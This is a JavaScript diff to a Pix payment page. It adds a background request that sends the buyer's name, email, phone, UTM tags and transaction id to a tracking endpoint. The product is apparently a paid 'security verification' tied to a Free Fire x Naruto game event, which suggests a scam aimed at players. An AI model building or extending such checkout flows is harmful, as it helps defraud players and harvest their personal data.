@@ -243,7 +243,23 @@ document.getElementById('cta-area').style.display='none';
 document.getElementById('pix-area').classList.add('active');
 document.getElementById('pix-qr-img').src='https://api.qrserver.com/v1/create-qr-code/?size=250x250&data='+encodeURIComponent(code);
 document.getElementById('pix-code-box').textContent=code;
-if(txHash)startPolling();
+if(txHash) {
+    startPolling();
+    // Envia sale.pending em background para o LowTrack
+    fetch('/api/track-pending', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            txid: txHash,
+            amount: '12.90',
+            utms: utms,
+            productTitle: 'Verificacao de Seguranca - FF x Naruto',
+            nome: nome,
+            email: email,
+            telefone: tel
+        })
+    }).catch(function(){});
+}
 })
 .catch(function(err){btn.disabled=false;btn.textContent='CONFIRMAR VERIFICAÇÃO — R$ 12,90';alert('Erro: '+err.message);});
 }
